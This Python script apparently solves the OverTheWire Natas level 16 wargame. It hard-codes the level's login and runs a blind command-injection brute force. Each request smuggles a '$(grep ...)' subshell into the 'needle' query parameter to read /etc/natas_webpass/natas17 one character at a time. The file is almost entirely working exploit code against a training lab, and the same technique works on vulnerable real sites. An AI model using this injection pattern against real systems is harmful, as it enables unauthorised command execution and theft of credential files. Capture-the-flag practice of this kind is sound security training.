import requests

session = requests.Session()
session.auth = ("natas16", "WaIHEacj63wnNIBROHeqi3p9t0m5nhmh")

occur = "1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"

password = ""

for i in range(64):
    for j in occur:
        auth = session.get('http://natas16.natas.labs.overthewire.org/index.php?needle='
         + "apple$(grep ^" + password + j + " /etc/natas_webpass/natas17)")

        print(password, j)

        if "apple" not in auth.text:
            #print(auth.text)
            password += j
            print(password)
            break



